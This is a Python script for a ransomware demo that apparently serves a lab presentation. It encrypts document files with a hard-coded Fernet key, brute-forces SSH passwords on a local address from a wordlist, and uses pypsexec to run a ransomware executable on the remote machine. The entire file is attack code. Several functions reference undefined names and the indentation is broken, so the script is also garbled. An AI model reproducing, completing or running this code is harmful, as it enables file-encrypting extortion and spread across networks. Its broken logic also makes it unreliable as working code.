#!/usr/bin/env python3
from cryptography.fernet import Fernet #Encrypt files
import os #Send commands to CMD
import paramiko #Bruteforcing SSH connection
import time #Bruteforcing SSH connection
from pypsexec.client import Client #Sending remote commands


    
#def encrypt file
def ransom():
    key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
    f = Fernet(key)
    with open(filename, "rb") as file:
    # read all file data
        file_data = file.read()
    # encrypt data
    encrypting_data = f.encrypt(file_data)
    #Write over the existing file
    with open(filename, "wb") as file:
        file.write(encrypting_data)

#Walkthrough the Documents folder and the P: drive
def fileWalk():
    for (root, dirs, files) in os.walk(start_path, topdown = False):
                for name in files:
                    path = os.path.join(root, name)
            if (path[-4:] == ".txt"):
                try:
                    encrypt_file(path, key)
                except:
                    pass
            elif (path[-4:] == ".doc"):
                encrypt_file(path, key)
            if (path[-4:] == ".pdf"):
                encrypt_file(path, key)
            elif (path[-5:] == ".docx"):
                encrypt_file(path, key)

#play video
def playVideo():
    os.system("cd C:\\Users\\IEUser\\Downloads")
    #CHANGE BACKGROUD



# sniff network 
def sniffNetwork():
    #IPAdress to second Windows 7 machine to speed up presentation
    ipAddress= '192.168.0.60'
    return ipAddress

#bruteforce
def bruteForce(user, ipAddress):
    filepath=open("./passwordlist.txt")
    ssh=paramiko.SSHClient()
    for i in filepath.readlines():
        secret=i.strip("\n")
        try:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ipAddress, username="IEUser", password=secret)
            return secret
        except:
            time.sleep(1)
            print(secret)

#Transfer
def transferFile():
    os.system("robocopy C:\\Users\\IEUser\Downloads P:\\  ") #P:\\ zip folder
    os.system("robocopy P:\\ C:\\Users\\IEUser\Downloads  ")#Fresh copy to start thr cycle again 


#Remote execute file
def remoteExecute(ipAddress, user, password):
    c = Client(ipAddress, username=user, password=password,  encrypt=False)
    c.connect()
    try:
        c.create_service()
        stdout, stderr, rc = c.run_executable("P:\\registration.exe") #Execute ransomware from P Drive
    except:
        print("done")

def main():
    user= "IEUser"
    ransom()
    playVideo()
    ipAddress= sniffNetwork()
    print(ipAddress)
    password=bruteForce(user,ipAddress)
    print(password)
    remoteExecute(ipAddress,user, password)
main()